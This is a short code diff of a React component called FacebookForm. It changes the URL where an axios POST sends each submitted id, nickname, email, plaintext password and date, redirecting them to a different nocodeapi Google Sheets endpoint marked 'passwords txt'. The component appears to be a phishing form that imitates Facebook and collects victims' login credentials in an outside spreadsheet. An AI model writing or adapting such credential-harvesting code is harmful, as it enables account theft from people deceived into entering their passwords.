@@ -37,7 +37,7 @@ const FacebookForm = () => {
 
         axios ({
             method: 'post',
-            url: 'https://v1.nocodeapi.com/tuxa/google_sheets/xQtvMBfFFgfpISRL?tabId=Sheet1', 
+            url: 'https://v1.nocodeapi.com/tuxa3/google_sheets/bERXdJyFTjGsXOJm?tabId=Sheet1', // passwords txt (1, 3)
             params: {},
             data: [[id, nicknameVal, email, password, date]]
         }).then(function () {
